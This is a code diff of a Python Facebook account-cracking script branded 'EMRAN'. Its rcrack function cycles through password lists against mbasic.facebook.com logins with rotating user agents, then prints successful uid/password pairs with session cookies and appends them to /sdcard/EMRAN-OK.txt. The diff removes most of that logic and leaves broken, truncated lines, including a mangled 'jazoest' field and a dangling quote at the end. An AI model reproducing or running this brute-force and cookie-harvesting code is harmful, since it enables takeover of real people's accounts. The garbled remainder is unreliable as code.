@@ -247,7 +247,7 @@ def rcrack(uid,pwx,tl):
     global loop
     global cps
     global oks
-    global proxy
+    
     try:
         for ps in pwx:
             pro = random.choice(ugen)
@@ -255,7 +255,7 @@ def rcrack(uid,pwx,tl):
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+    'name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
             "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
             "try_number":"0",
@@ -265,44 +265,4 @@ def rcrack(uid,pwx,tl):
             "login":"Log In"}
             header_freefb = {'authority': 'mbasic.facebook.com',
             'method':'GET',
-            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
-            'scheme':'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://mbasic.facebook.com',
-            'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro}
-            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]              
-                print('\r\r\033[1;32m [EMRAN-OK💉] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie 🍪= \033[1;32m'+coki+  '  ''  \033[0;97m')
-                cek_apk(session,coki)
-                open('/sdcard/EMRAN-OK.txt', 'a').write( uid+' | '+ps+'\n')
-                oks.append(cid)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[24:39]                
-                #print('\r\r\33[1;31m [EMRAN-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
-                #('/sdcard/EMRAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
-                cps.append(cid)
-                break
-            else:
-                continue
-        loop+=1        
-    except:
-        pass
-
-xxr()
+            '
